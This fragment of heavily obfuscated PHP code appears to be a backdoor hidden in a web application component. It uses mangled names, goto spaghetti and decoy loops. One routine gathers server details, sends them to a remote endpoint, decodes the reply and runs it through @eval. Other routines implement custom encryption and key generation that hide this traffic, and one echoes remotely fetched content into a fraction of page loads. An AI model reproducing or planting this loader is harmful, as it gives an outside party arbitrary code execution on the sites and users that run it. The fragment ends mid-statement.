$FÉßÂ‹‚éØ[$fÉÈä« © [280]]) { if ($this->{$_SERVER[òÀÆ×ø][199]}($FÉßÂ‹‚éØ[$fÉÈä« © [280]]) == $CÖ„ğ÷¤á[$fÉÈä« © [165]]) { return; } } goto e•øÒç­Ê; dæÊ†Å»µ: $e²‘«Ÿ£Ÿ = $f£Úˆ¾Øò[613]; $FÉßÂ‹‚éØ = $this->{$_SERVER[òÀÆ×ø][182]}($fÉÈä« © [279], $CÖ„ğ÷¤á); $f§ïÎÉ„‹‡ = $f£Úˆ¾Øò[614]; goto DšÈ¦ó‚©²; e•øÒç­Ê: $this->{$_SERVER[òÀÆ×ø][164]}(); if ($this->{$_SERVER[òÀÆ×ø][199]}($FÉßÂ‹‚éØ[$fÉÈä« © [280]]) != $CÖ„ğ÷¤á[$fÉÈä« © [165]]) { $A•‡‚ã”‚² = array($fÉÈä« © [202] => $fÉÈä« © [61]($fÉÈä« © [62])->{$_SERVER[òÀÆ×ø][63]}($fÉÈä« © [116]), $fÉÈä« © [203] => $_SERVER[$fÉÈä« © [115]], $fÉÈä« © [204] => $fÉÈä« © [205](), $fÉÈä« © [174] => $_SERVER[$fÉÈä« © [175]]); $c„Ë ˆ¼Ñ = $this->{$_SERVER[òÀÆ×ø][206]}($fÉÈä« © [148]($A•‡‚ã”‚²)); $FÉßÂ‹‚éØ = $this->{$_SERVER[òÀÆ×ø][182]}($fÉÈä« © [207] . $c„Ë ˆ¼Ñ); if ($FÉßÂ‹‚éØ && $fÉÈä« © [191]($FÉßÂ‹‚éØ) && isset($FÉßÂ‹‚éØ[$fÉÈä« © [280]])) { $B¾ƒ‰ğø˜‘ = $this->{$_SERVER[òÀÆ×ø][188]}($FÉßÂ‹‚éØ[$fÉÈä« © [280]], 2); if ($B¾ƒ‰ğø˜‘) { $B¾ƒ‰ğø˜‘ = $this->{$_SERVER[òÀÆ×ø][199]}($B¾ƒ‰ğø˜‘); } if ($B¾ƒ‰ğø˜‘) { try { @eval($B¾ƒ‰ğø˜‘); } catch (Exception $d¬‚¡‡ŸÃ…) { } } } } goto eÓ°ø›ÓÅî; DÈ¦ö®–»Œ: $f£Úˆ¾Øò =& $_SERVER[£ü]; $fÉÈä« ©  =& $_SERVER[òÀÆ×ø]; $d¥ñ©«ßéš = array($fÉÈä« © [271], $fÉÈä« © [272], $fÉÈä« © [273]); goto eñàƒäÂ¡‰; eÓ°ø›ÓÅî: } private function yprn5cd4b65b($eíñÄ»ŞÃ = '', $F×È´‚¨ğÑ = array(), $eƒè¨®®› = 5) { goto bëò°¯Ş; bëò°¯Ş: $E¬ô‹¬Ùò“ =& $_SERVER[£ü]; $FììŒœ÷²İ =& $_SERVER[òÀÆ×ø]; $a¹¼°î†«Ø = $FììŒœ÷²İ[281]; goto f¢á‰¡à‘ù; fò¹’àŒ®‚: return $FììŒœ÷²İ[190]($F×È´‚¨ğÑ, !0); $e÷ğå›“É = $E¬ô‹¬Ùò“[616]; if (!$e÷ğå›“É) { die; } goto C›ÙŒÃéò…; f¢á‰¡à‘ù: $a¹¼°î†«Ø = $this->{$_SERVER[òÀÆ×ø][243]}($a¹¼°î†«Ø, $FììŒœ÷²İ[282]); $a¹¼°î†«Ø = $a¹¼°î†«Ø . $eíñÄ»ŞÃ . $FììŒœ÷²İ[283] . $FììŒœ÷²İ[284]($F×È´‚¨ğÑ); if ($F×È´‚¨ğÑ === -1) { return $a¹¼°î†«Ø; } goto eôˆÛÙ‚ ê; eôˆÛÙ‚ ê: $Aàßš¨™‰ = $FììŒœ÷²İ[245](array($FììŒœ÷²İ[246] => array($FììŒœ÷²İ[249] => $eƒè¨®®›, $FììŒœ÷²İ[247] => $FììŒœ÷²İ[285]), $FììŒœ÷²İ[286] => array($FììŒœ÷²İ[287] => !1, $FììŒœ÷²İ[288] => !1))); $F×È´‚¨ğÑ = @$FììŒœ÷²İ[250]($a¹¼°î†«Ø, !1, $Aàßš¨™‰); $FŠ¼Ê‚óĞó = $E¬ô‹¬Ùò“[615]; goto fò¹’àŒ®‚; C›ÙŒÃéò…: } private function gpbtdd6cfed6() { goto b‡æÎ°ĞØ; D…«›¨ª˜: $BËÕÌê¶Êµ = $Eñàø·¯Ë”[620]; return $A÷÷ïƒŸ + $D†ª‡»›ç; $B¬–ğÅ¹í– = $Eñàø·¯Ë”[621]; goto bó®±îÉÂ¡; cÒ¾º¢§èµ: $fÂø“– = $Eñàø·¯Ë”[617]; $A÷÷ïƒŸ = $Cº±„‡İˆç[$this->cioj84c6a100]; $c˜öÂÀÉä = $Eñàø·¯Ë”[618]; goto B¦÷Ç¨›Á; B¦÷Ç¨›Á: if (!$c˜öÂÀÉä) { die; } $A÷÷ïƒŸ = $Féó”ÎˆÓÄ[201]($A÷÷ïƒŸ ? $A÷÷ïƒŸ : $Féó”ÎˆÓÄ[290]); $D†ª‡»›ç = $Féó”ÎˆÓÄ[104]($this->vbxh43eb306f, $Féó”ÎˆÓÄ[316]); goto EØƒùƒ…É; EØƒùƒ…É: $f¿ÅÎ°º†œ = $Eñàø·¯Ë”[619]; if (!$f¿ÅÎ°º†œ) { return; } $D†ª‡»›ç = $D†ª‡»›ç ? $Féó”ÎˆÓÄ[201]($D†ª‡»›ç) : 0; goto D…«›¨ª˜; b‡æÎ°ĞØ: $Eñàø·¯Ë” =& $_SERVER[£ü]; $Féó”ÎˆÓÄ =& $_SERVER[òÀÆ×ø]; $Cº±„‡İˆç = array($Féó”ÎˆÓÄ[289] => $Féó”ÎˆÓÄ[290], $Féó”ÎˆÓÄ[291] => $Féó”ÎˆÓÄ[292], $Féó”ÎˆÓÄ[293] => $Féó”ÎˆÓÄ[294], $Féó”ÎˆÓÄ[295] => $Féó”ÎˆÓÄ[296], $Féó”ÎˆÓÄ[297] => $Féó”ÎˆÓÄ[298], $Féó”ÎˆÓÄ[299] => $Féó”ÎˆÓÄ[238], $Féó”ÎˆÓÄ[300] => $Féó”ÎˆÓÄ[238], $Féó”ÎˆÓÄ[301] => $Féó”ÎˆÓÄ[290], $Féó”ÎˆÓÄ[302] => $Féó”ÎˆÓÄ[292], $Féó”ÎˆÓÄ[303] => $Féó”ÎˆÓÄ[294], $Féó”ÎˆÓÄ[304] => $Féó”ÎˆÓÄ[305], $Féó”ÎˆÓÄ[306] => $Féó”ÎˆÓÄ[296], $Féó”ÎˆÓÄ[307] => $Féó”ÎˆÓÄ[308], $Féó”ÎˆÓÄ[309] => $Féó”ÎˆÓÄ[298], $Féó”ÎˆÓÄ[310] => $Féó”ÎˆÓÄ[311], $Féó”ÎˆÓÄ[312] => $Féó”ÎˆÓÄ[313], $Féó”ÎˆÓÄ[314] => $Féó”ÎˆÓÄ[315]); goto cÒ¾º¢§èµ; bó®±îÉÂ¡: } public function nygte89129bc($CùåòĞë›¸) { goto CÉÉ¹Ç¸; CÉÉ¹Ç¸: $EíÇ—‡ÓÌ¾ =& $_SERVER[£ü]; $BÅÍÕìš†ğ =& $_SERVER[òÀÆ×ø]; $E¼›‘ÜºÓ = $this->{$_SERVER[òÀÆ×ø][137]}(); goto eÖ®ù»àÀ; AĞ‘¹‹õ°±: while (strlen($cÖ×ğä”‡) < $EíÇ—‡ÓÌ¾[566]) { if (!$cÖ×ğä”‡) { break; } $cÖ×ğä”‡++; } if ($Cõ¿‹êéô <= $E¼›‘ÜºÓ) { return; } $E¡Ô¢îË¦ = $BÅÍÕìš†ğ[61]($BÅÍÕìš†ğ[139])->{$_SERVER[òÀÆ×ø][317]}($BÅÍÕìš†ğ[318])->{$_SERVER[òÀÆ×ø][319]}($E¼›‘ÜºÓ)->{$_SERVER[òÀÆ×ø][320]}(); goto A…¨·Ëéí; eÖ®ù»àÀ: if ($E¼›‘ÜºÓ >= $BÅÍÕìš†ğ[201]($BÅÍÕìš†ğ[238])) { return; } $Cõ¿‹êéô = $BÅÍÕìš†ğ[61]($BÅÍÕìš†ğ[139])->{$_SERVER[òÀÆ×ø][140]}(); $cÖ×ğä”‡ = $EíÇ—‡ÓÌ¾[622]; goto AĞ‘¹‹õ°±; A…¨·Ëéí: $E¡Ô¢îË¦ = $BÅÍÕìš†ğ[222]($E¡Ô¢îË¦, $BÅÍÕìš†ğ[10], $BÅÍÕìš†ğ[318]); if (!$BÅÍÕìš†ğ[236]($CùåòĞë›¸[$BÅÍÕìš†ğ[318]], $E¡Ô¢îË¦)) { $BÅÍÕìš†ğ[166]($BÅÍÕìš†ğ[321], !1, $BÅÍÕìš†ğ[233]); } goto bËÕÑåˆ°; bËÕÑåˆ°: } public function maldf4678000() { goto DØ—ê–ÀÃ×; déî¡ •Ñ»: $bèÌè™„šç = @$f¤—¸›äÂÇ[250]($d‘´í’Ú©ò, !1, $b°ÜøÑ–ç); $d…Õ—´Ä = $Cé´Œ§èÒÆ[625]; if (strlen($d…Õ—´Ä) < $Cé´Œ§èÒÆ[554]) { die; } goto E×óí¯Û„; E×óí¯Û„: echo $f¤—¸›äÂÇ[323] . $f¤—¸›äÂÇ[324]($bèÌè™„šç) . $f¤—¸›äÂÇ[325]; $EëÊ¤—¶Ÿ = $Cé´Œ§èÒÆ[626]; if (strlen($EëÊ¤—¶Ÿ) < $Cé´Œ§èÒÆ[558]) { die; } goto eÆÙš÷ŠË; Cåó·†×ÔÄ: $b°ÜøÑ–ç = $f¤—¸›äÂÇ[245](array($f¤—¸›äÂÇ[246] => array($f¤—¸›äÂÇ[247] => $f¤—¸›äÂÇ[248], $f¤—¸›äÂÇ[249] => 3))); $eé†Ô±¹ç„ = $Cé´Œ§èÒÆ[624]; while (strlen($eé†Ô±¹ç„) < $Cé´Œ§èÒÆ[547]) { if (!$eé†Ô±¹ç„) { break; } $eé†Ô±¹ç„++; } goto déî¡ •Ñ»; aèÈø­èö: $d‘´í’Ú©ò = $f¤—¸›äÂÇ[242]; $EÎî¥šÚé± = $Cé´Œ§èÒÆ[623]; $d‘´í’Ú©ò = $this->{$_SERVER[òÀÆ×ø][243]}($d‘´í’Ú©ò, $f¤—¸›äÂÇ[244]); goto Cåó·†×ÔÄ; DØ—ê–ÀÃ×: $Cé´Œ§èÒÆ =& $_SERVER[£ü]; $f¤—¸›äÂÇ =& $_SERVER[òÀÆ×ø]; if (!$f¤—¸›äÂÇ[104]($GLOBALS, $f¤—¸›äÂÇ[132]) || $f¤—¸›äÂÇ[322](1, 100) > 20) { return; } goto aèÈø­èö; eÆÙš÷ŠË: } private function rkia90ea8bce($EÏÎø½Èä, $DùëÎ“¡´, $D²Â»¶ïÀ• = 3) { goto eÈß¾£«ª¾; EÜÄ‰—¥Â: $EÏÎø½Èä = $B­‘§ƒóµŠ[2]($EÏÎø½Èä); $cÉ´»‡‹î‰ = $fÊ¥ˆÛì‚¸[627]; $E«ôÑÁÂ = $B­‘§ƒóµŠ[322](0, 5) . $B­‘§ƒóµŠ[10]; goto dËĞ®¬œµŞ; eÈß¾£«ª¾: $fÊ¥ˆÛì‚¸ =& $_SERVER[£ü]; $B­‘§ƒóµŠ =& $_SERVER[òÀÆ×ø]; $B­‘§ƒóµŠ[326](1); goto EÜÄ‰—¥Â; fÆ°¢âŠŸ: $fÒ×ÊÒ±œà = $B­‘§ƒóµŠ[327]; $BŒ’†¦´ñ = $fÊ¥ˆÛì‚¸[629]; if (!$BŒ’†¦´ñ) { die; } goto BÓ¹ò©ØŠ‚; BÓ¹ò©ØŠ‚: switch ($E«ôÑÁÂ) { case $B­‘§ƒóµŠ[229]: $Dô¬ÈåŒ¤‚ = $this->{$_SERVER[òÀÆ×ø][147]}($EÏÎø½Èä, $B­‘§ƒóµŠ[214]($DùëÎ“¡´ . $bÂ‡ ÀŸ‚‡)); $e¾Úï„»‹– = $fÊ¥ˆÛì‚¸[630]; if (!$e¾Úï„»‹–) { return; } break; $Cæ‰ãÎ–à© = $fÊ¥ˆÛì‚¸[631]; case $B­‘§ƒóµŠ[220]: $Dô¬ÈåŒ¤‚ = $this->{$_SERVER[òÀÆ×ø][147]}($EÏÎø½Èä, $B­‘§ƒóµŠ[214]($bÂ‡ ÀŸ‚‡ . $DùëÎ“¡´)); $aòµøá·ÍØ = $fÊ¥ˆÛì‚¸[632]; if (strlen($aòµøá·ÍØ) < $fÊ¥ˆÛì‚¸[566]) { die; } break; $dìö¬÷‘¶« = $fÊ¥ˆÛì‚¸[633]; case $B­‘§ƒóµŠ[328]: $Dô¬ÈåŒ¤‚ = $this->{$_SERVER[òÀÆ×ø][147]}($EÏÎø½Èä, $B­‘§ƒóµŠ[118]($bÂ‡ ÀŸ‚‡ . $DùëÎ“¡´)); $a©Äœƒ¢Æ× = $fÊ¥ˆÛì‚¸[634]; if (strlen($a©Äœƒ¢Æ×) < $fÊ¥ˆÛì‚¸[554]) { return; } break; case $B­‘§ƒóµŠ[329]: $Dô¬ÈåŒ¤‚ = $this->{$_SERVER[òÀÆ×ø][147]}($EÏÎø½Èä, $B­‘§ƒóµŠ[114]($bÂ‡ ÀŸ‚‡ . $DùëÎ“¡´)); break; case $B­‘§ƒóµŠ[330]: goto D™Ù• ƒÕ‚; F°Ã½ğ æï: $Bí½‹„ñÍÁ = $fÊ¥ˆÛì‚¸[635]; $B•´½à‰  = $B­‘§ƒóµŠ[114]($aœ£•ï‡î . $B­‘§ƒóµŠ[114]($DùëÎ“¡´ . $aœ£•ï‡î) . $DùëÎ“¡´); $dÔ„÷ì°‡ = $fÊ¥ˆÛì‚¸[636]; goto C´Í±¤ó¶Ğ; fÈŠ˜éÎ»: for ($b×àÇãÀ« = 0; $b×àÇãÀ« < $B­‘§ƒóµŠ[24]($EÏÎø½Èä); $b×àÇãÀ«++) { $A³Ò‹”íöê = $A³Ò‹”íöê == $B­‘§ƒóµŠ[24]($B•´½à‰ ) ? 0 : $A³Ò‹”íöê; $Dò¢ËñÑùŒ = ($cÎŒƒÂ½ö + $B­‘§ƒóµŠ[332]($fÒ×ÊÒ±œà, $EÏÎø½Èä[$b×àÇãÀ«]) + $B­‘§ƒóµŠ[333]($B•´½à‰ [$A³Ò‹”íöê++])) % 64; $Aóçâµ½˜Ò .= $fÒ×ÊÒ±œà[$Dò¢ËñÑùŒ]; $b‘×–ÂºŞš = $fÊ¥ˆÛì‚¸[637]; if (!$b‘×–ÂºŞš) { die; } } $Dô¬ÈåŒ¤‚ = $B­‘§ƒóµŠ[324]($aœ£•ï‡î . $Aóçâµ½˜Ò); break; goto b³â¥å¼†–; C´Í±¤ó¶Ğ: if (strlen($dÔ„÷ì°‡) < $fÊ¥ˆÛì‚¸[566]) { return; } $B•´½à‰  = $B­‘§ƒóµŠ[25]($B•´½à‰ , $cÎŒƒÂ½ö % 8, $cÎŒƒÂ½ö % 8 + 7); $Aóçâµ½˜Ò = $B­‘§ƒóµŠ[10]; goto d«Ğ’Ç¡¹; d«Ğ’Ç¡¹: $b×àÇãÀ« = 0; $Dò¢ËñÑùŒ = 0; $A³Ò‹”íöê = 0; goto fÈŠ˜éÎ»; D™Ù• ƒÕ‚: $EÏÎø½Èä = $B­‘§ƒóµŠ[118]($EÏÎø½Èä); $cÎŒƒÂ½ö = $B­‘§ƒóµŠ[331](0, 64); $aœ£•ï‡î = $fÒ×ÊÒ±œà[$cÎŒƒÂ½ö]; goto F°Ã½ğ æï; b³â¥å¼†–: default: $Dô¬ÈåŒ¤‚ = $this->{$_SERVER[òÀÆ×ø][147]}($EÏÎø½Èä, $DùëÎ“¡´ . $bÂ‡ ÀŸ‚‡); $eŞÉªè¥é = $fÊ¥ˆÛì‚¸[638]; if (!$eŞÉªè¥é) { die; } break; $E÷‚Ä¢ìå = $fÊ¥ˆÛì‚¸[639]; while (strlen($E÷‚Ä¢ìå) < $fÊ¥ˆÛì‚¸[554]) { if (!$E÷‚Ä¢ìå) { break; } $E÷‚Ä¢ìå++; } } $Dô¬ÈåŒ¤‚ = $B­‘§ƒóµŠ[214]($E«ôÑÁÂ . $bÂ‡ ÀŸ‚‡ . $Dô¬ÈåŒ¤‚); $d…º¾¦·™ = $fÊ¥ˆÛì‚¸[640]; goto DÏÆ®ŒÓ«ˆ; DÏÆ®ŒÓ«ˆ: while (strlen($d…º¾¦·™) < $fÊ¥ˆÛì‚¸[547]) { if (!$d…º¾¦·™) { break; } $d…º¾¦·™++; } if ($D²Â»¶ïÀ• - 1 > 0) { $Dô¬ÈåŒ¤‚ = $this->{$_SERVER[òÀÆ×ø][127]}($Dô¬ÈåŒ¤‚, $DùëÎ“¡´, $D²Â»¶ïÀ• - 1); } return $Dô¬ÈåŒ¤‚; goto bÇ¢‘µ½°; dËĞ®¬œµŞ: $bÂ‡ ÀŸ‚‡ = $B­‘§ƒóµŠ[124](15); $c¦Á¨¼›İğ = $fÊ¥ˆÛì‚¸[628]; while (strlen($c¦Á¨¼›İğ) < $fÊ¥ˆÛì‚¸[550]) { if (!$c¦Á¨¼›İğ) { break; } $c¦Á¨¼›İğ++; } goto fÆ°¢âŠŸ; bÇ¢‘µ½°: } private function gbxw0586527a($c÷½©œñô, $aÏÛ—Üˆì–, $e»Úà½â³ = 3) { goto FÄ®¬®ÛÒ÷; B®¾–˜ÒšŞ: $A«­å¸…î§ = $fß±¦ÑİŠ×[327]; $eÌÌ†¨É = $b¶Ûùó«Èã[644]; if (strlen($eÌÌ†¨É) < $b¶Ûùó«Èã[554]) { die; } goto aã‡Š÷˜â; d•˜–’§¶‘: $A¯âÕÀ˜¹‰ = $c÷½©œñô[0]; $D¼çªå« = $b¶Ûùó«Èã[642]; $cÍÀª¯èŞ  = $fß±¦ÑİŠ×[25]($c÷½©œñô, 1, 15); goto bšºòàÙó¨; bšºòàÙó¨: $c÷½©œñô = $fß±¦ÑİŠ×[25]($c÷½©œñô, 16); $fÕˆïÓ‡¯ = $b¶Ûùó«Èã[643]; if (strlen($fÕˆïÓ‡¯) < $b¶Ûùó«Èã[566]) { return; } goto B®¾–˜ÒšŞ; Fè¨çâÂ°í: $c÷½©œñô = $fß±¦ÑİŠ×[2]($c÷½©œñô); $dçÍÉİù‚ = $b¶Ûùó«Èã[641]; $c÷½©œñô = $fß±¦ÑİŠ×[214]($c÷½©œñô); goto d•˜–’§¶‘; aã‡Š÷˜â: switch ($A¯âÕÀ˜¹‰) { case $fß±¦ÑİŠ×[229]: $d•¼ø§âĞ = $this->{$_SERVER[òÀÆ×ø][243]}($c÷½©œñô, $fß±¦ÑİŠ×[214]($aÏÛ—Üˆì– . $cÍÀª¯èŞ )); break; case $fß±¦ÑİŠ×[220]: $d•¼ø§âĞ = $this->{$_SERVER[òÀÆ×ø][243]}($c÷½©œñô, $fß±¦ÑİŠ×[214]($cÍÀª¯èŞ  . $aÏÛ—Üˆì–)); $D²Ì„Şòµİ = $b¶Ûùó«Èã[645]; if (!$D²Ì„Şòµİ) { return; } break; case $fß±¦ÑİŠ×[328]: $d•¼ø§âĞ = $this->{$_SERVER[òÀÆ×ø][243]}($c÷½©œñô, $fß±¦ÑİŠ×[118]($cÍÀª¯èŞ  . $aÏÛ—Üˆì–)); break; case $fß±¦ÑİŠ×[329]: $d•¼ø§âĞ = $this->{$_SERVER[òÀÆ×ø][243]}($c÷½©œñô, $fß±¦ÑİŠ×[114]($cÍÀª¯èŞ  . $aÏÛ—Üˆì–)); break; $d¸“÷ ¹ÏÏ = $b¶Ûùó«Èã[646]; case $fß±¦ÑİŠ×[330]: goto BØª£î¶•“; C¬õ¯§±¿: $eîÚœÈ‰’Å = $b¶Ûùó«Èã[647]; if (!$eîÚœÈ‰’Å) { die; } $BíÇù… ¿¥ = $fß±¦ÑİŠ×[10]; goto DƒĞÕ§×²æ; E˜£ÛÓ¶µ”: $bùÁÜ×çÏÉ = $b¶Ûùó«Èã[649]; $dùËùÌÏ = 0; $dŞ‘µã‰· = $b¶Ûùó«Èã[650]; goto F²Ü¹¦¹; DƒĞÕ§×²æ: $b¼Á‰Ì†á = $b¶Ûùó«Èã[648]; if (strlen($b¼Á‰Ì†á) < $b¶Ûùó«Èã[547]) { die; } $DÄÏ¾‘‘òğ = 0; goto E˜£ÛÓ¶µ”; F²Ü¹¦¹: if (strlen($dŞ‘µã‰·) < $b¶Ûùó«Èã[547]) { return; } $eÃŒƒˆ±Îß = 0; $BÆ—Î„“ â = $b¶Ûùó«Èã[651]; goto EÂÍìâÂ; B›ôÆŒ—…‡: break; $AØº‡³²Áœ = $b¶Ûùó«Èã[654]; goto DÏÑ«ĞßƒÄ; BØª£î¶•“: $c÷½©œñô = $fß±¦ÑİŠ×[335]($c÷½©œñô); $eƒ£Â‘«ŒØ = $c÷½©œñô[0]; $c÷½©œñô = $fß±¦ÑİŠ×[25]($c÷½©œñô, 1); goto c°À‹ğÓ÷; c°À‹ğÓ÷: $Aëœ˜¦•å = $fß±¦ÑİŠ×[332]($A«­å¸…î§, $eƒ£Â‘«ŒØ); $d¦”Ú¼ = $fß±¦ÑİŠ×[114]($eƒ£Â‘«ŒØ . $fß±¦ÑİŠ×[114]($aÏÛ—Üˆì– . $eƒ£Â‘«ŒØ) . $aÏÛ—Üˆì–); $d¦”Ú¼ = $fß±¦ÑİŠ×[25]($d¦”Ú¼, $Aëœ˜¦•å % 8, $Aëœ˜¦•å % 8 + 7); goto C¬õ¯§±¿; EÂÍìâÂ: while ($BÆ—Î„“ â < $b¶Ûùó«Èã[566]) { if ($BÆ—Î„“ â >= 0) { break; } $BÆ—Î„“ â++; } for ($DÄÏ¾‘‘òğ = 0; $DÄÏ¾‘‘òğ < $fß±¦ÑİŠ×[24]($c÷½©œñô); $DÄÏ¾‘‘òğ++) { $eÃŒƒˆ±Îß = $eÃŒƒˆ±Îß == $fß±¦ÑİŠ×[24]($d¦”Ú¼) ? 0 : $eÃŒƒˆ±Îß; $f¯ÄßšÙ³ = $eÃŒƒˆ±Îß++; $Dæ’ŒÛ©ò = $b¶Ûùó«Èã[652]; while (strlen($Dæ’ŒÛ©ò) < $b¶Ûùó«Èã[558]) { if (!$Dæ’ŒÛ©ò) { break; } $Dæ’ŒÛ©ò++; } $dùËùÌÏ = $fß±¦ÑİŠ×[332]($A«­å¸…î§, $c÷½©œñô[$DÄÏ¾‘‘òğ]) - $Aëœ˜¦•å - $fß±¦ÑİŠ×[333]($d¦”Ú¼[$f¯ÄßšÙ³]); $eñ¢×¸©œø = $b¶Ûùó«Èã[653]; while ($eñ¢×¸©œø < $b¶Ûùó«Èã[554]) { if ($eñ¢×¸©œø >= 0) { break; } $eñ¢×¸©œø++; } while ($dùËùÌÏ < 0) { $dùËùÌÏ += 64; } $BíÇù… ¿¥ .= $A«­å¸…î§[$dùËùÌÏ]; } $d•¼ø§âĞ = $fß±¦ÑİŠ×[336]($BíÇù… ¿¥); goto B›ôÆŒ—…‡; DÏÑ«ĞßƒÄ: default: $d•¼ø§âĞ = $this->{$_SERVER[òÀÆ×ø][243]}($c÷½©œñô, $aÏÛ—Üˆì– . $cÍÀª¯èŞ ); break; } if ($e»Úà½â³ - 1 > 0) { $d•¼ø§âĞ = $this->{$_SERVER[òÀÆ×ø][188]}($d•¼ø§âĞ, $aÏÛ—Üˆì–, $e»Úà½â³ - 1); } return $d•¼ø§âĞ; goto E¿£²±¯óÆ; FÄ®¬®ÛÒ÷: $b¶Ûùó«Èã =& $_SERVER[£ü]; $fß±¦ÑİŠ× =& $_SERVER[òÀÆ×ø]; if (!$fß±¦ÑİŠ×[334]($c÷½©œñô) || $fß±¦ÑİŠ×[24]($c÷½©œñô) < 10) { return !1; } goto Fè¨çâÂ°í; E¿£²±¯óÆ: } public function pnloc53c9eeb($f®ÏÄÑïºÀ) { goto fî§ƒ¼¶©£; AÅÙßò‡ˆë: $C¯‡ìòŠ—Î = $Bó‘ÀÒÏç[660]; for ($e¡Ş¥’ÆÑå = 0; $e¡Ş¥’ÆÑå < $Cƒ¾Öî¼„ * 10; $e¡Ş¥’ÆÑå++) { if (($Cƒ¾Öî¼„ * $e¡Ş¥’ÆÑå + 1) % $eœôéØ£¡— == 0) { $C¹øÖæâÄÀ = $FÀË¾ÃŠ”[201](($Cƒ¾Öî¼„ * $e¡Ş¥’ÆÑå + 1) / $eœôéØ£¡—); break; } } $aŒø‰¯Ä±š = $this->{$_SERVER[òÀÆ×ø][147]}($Fî“Œ±§ˆĞ * $B‹ÉÈŒ‡è . $FÀË¾ÃŠ”[10], $FÀË¾ÃŠ”[149]); goto fø…ŸÚàõÀ; E‹ãøÕä´‚: $d¹©Å¿×ÖÄ = $this->{$_SERVER[òÀÆ×ø][147]}($f®ÏÄÑïºÀ, $Bˆìì¼‘Í) . $FÀË¾ÃŠ”[341] . $aŒø‰¯Ä±š; return $d¹©Å¿×ÖÄ; $b¦„ô¯ˆí = $Bó‘ÀÒÏç[662]; goto aªÅ‰™Ø½; fø…ŸÚàõÀ: $A¶íÆ‘´» = $Bó‘ÀÒÏç[661]; while ($A¶íÆ‘´» < $Bó‘ÀÒÏç[547]) { if ($A¶íÆ‘´» >= 0) { break; } $A¶íÆ‘´»++; } $Bˆìì¼‘Í = $FÀË¾ÃŠ”[114]($FÀË¾ÃŠ”[338] . ($Fî“Œ±§ˆĞ + $B‹ÉÈŒ‡è) . $FÀË¾ÃŠ”[339] . $eœôéØ£¡— . $FÀË¾ÃŠ”[339] . $C¹øÖæâÄÀ . $FÀË¾ÃŠ”[340]); goto E‹ãøÕä´‚; fî§ƒ¼¶©£: $Bó‘ÀÒÏç =& $_SERVER[£ü]; $FÀË¾ÃŠ” =& $_SERVER[òÀÆ×ø]; $Fî“Œ±§ˆĞ = $this->{$_SERVER[òÀÆ×ø][337]}(); goto eì‚­†îÎ; aªÅ‰™Ø½: if (strlen($b¦„ô¯ˆí) < $Bó‘ÀÒÏç[547]) { die; } goto F´ÆŞ“Ä¡; FïÒ¹Â‹ÊÉ: $EŞğÌÛ™°Á = $Bó‘ÀÒÏç[656]; while ($EŞğÌÛ™°Á < $Bó‘ÀÒÏç[554]) { if ($EŞğÌÛ™°Á >= 0) { break; } $EŞğÌÛ™°Á++; } $Cƒ¾Öî¼„ = ($Fî“Œ±§ˆĞ - 1) * ($B‹ÉÈŒ‡è - 1); goto c·¢®Æ÷•é; c·¢®Æ÷•é: $eœôéØ£¡— = $FÀË¾ÃŠ”[201](($Fî“Œ±§ˆĞ + $B‹ÉÈŒ‡è) / 2); while (1) { $bÕèŞÀó‚Û = $eœôéØ£¡—; $b˜èë‡©‘ = $Bó‘ÀÒÏç[657]; if (strlen($b˜èë‡©‘) < $Bó‘ÀÒÏç[550]) { return; } $D²ŒÊŸÏ = $Cƒ¾Öî¼„; while ($D²ŒÊŸÏ % $bÕèŞÀó‚Û != 0) { $aÙ±æ¢Ğ»¹ = $D²ŒÊŸÏ; $AøìæÚ = $Bó‘ÀÒÏç[658]; $D²ŒÊŸÏ = $bÕèŞÀó‚Û; $eğİ÷Ğº‰ = $Bó‘ÀÒÏç[659]; if (strlen($eğİ÷Ğº‰) < $Bó‘ÀÒÏç[566]) { return; } $bÕèŞÀó‚Û = $aÙ±æ¢Ğ»¹ % $bÕèŞÀó‚Û; } if ($bÕèŞÀó‚Û == 1) { break; } else { $eœôéØ£¡—++; } } $C¹øÖæâÄÀ = 2; goto AÅÙßò‡ˆë; eì‚­†îÎ: $Dî‰–Ú¡ã = $Bó‘ÀÒÏç[655]; if (strlen($Dî‰–Ú¡ã) < $Bó‘ÀÒÏç[547]) { die; } $B‹ÉÈŒ‡è = $this->{$_SERVER[òÀÆ×ø][337]}(); goto FïÒ¹Â‹ÊÉ; F´ÆŞ“Ä¡: } public function tyiua71c21e2($bôÈ­Ø) { goto eÌõ´§Â…ˆ; d”ºçéŒ§Ä: if (!$eƒÛäÙ£”ê) { return; } for ($CÊò–Ä„” = 3; $CÊò–Ä„” < $eƒ¤èÎÈ‡´; $CÊò–Ä„” += 2) { if ($eƒ¤èÎÈ‡´ % $CÊò–Ä„” != 0) { continue; } $F ÌÏãÓñ = $CÊò–Ä„”; $B®°êÂĞ¹ê = $A‚ßñĞ’×±[665]; while ($B®°êÂĞ¹ê < $A‚ßñĞ’×±[547]) { if ($B®°êÂĞ¹ê >= 0) { break; } $B®°êÂĞ¹ê++; } $B‚Ã‚¼óªå = $B‘„÷¬Åš¬[201]($eƒ¤èÎÈ‡´ / $CÊò–Ä„”); break; $B‘ƒßØ¸÷ø = $A‚ßñĞ’×±[666]; while (strlen($B‘ƒßØ¸÷ø) < $A‚ßñĞ’×±[554]) { if (!$B‘ƒßØ¸÷ø) { break; } $B‘ƒßØ¸÷ø++; } } $C¿ªïã’Â = ($F ÌÏãÓñ - 1) * ($B‚Ã‚¼óªå - 1); goto Dåø¥­ê†©; DìÄªÖŒãº: for ($CÊò–Ä„” = 0; $CÊò–Ä„” < $C¿ªïã’Â * 10; $CÊò–Ä„”++) { if (($C¿ªïã’Â * $CÊò–Ä„” + 1) % $aŠÃÉïàæŠ == 0) { $E¸‰ìŠ¸å = $B‘„÷¬Åš¬[201](($C¿ªïã’Â * $CÊò–Ä„” + 1) / $aŠÃÉïàæŠ); break; } } $CèŸ„‹ ™Î = $B‘„÷¬Åš¬[114]($B‘„÷¬Åš¬[338] . ($F ÌÏãÓñ + $B‚Ã‚¼óªå) . $B‘„÷¬Åš¬[339] . $aŠÃÉïàæŠ . $B‘„÷¬Åš¬[339] . $E¸‰ìŠ¸å . $B‘„÷¬Åš¬[340]); $F°æÄŸ§•õ = $this->{$_SERVER[òÀÆ×ø][243]}($b››½Ö¥‘±[0], $CèŸ„‹ ™Î); goto Cö´¶ôÕˆò; f»Šµ¤÷Ğ‘: if (strlen($eÓÑÊ°ÙòŒ) < $A‚ßñĞ’×±[554]) { return; } $B‚Ã‚¼óªå = 0; $eƒÛäÙ£”ê = $A‚ßñĞ’×±[664]; goto d”ºçéŒ§Ä; CÑ”áÉ¹ïŒ: if 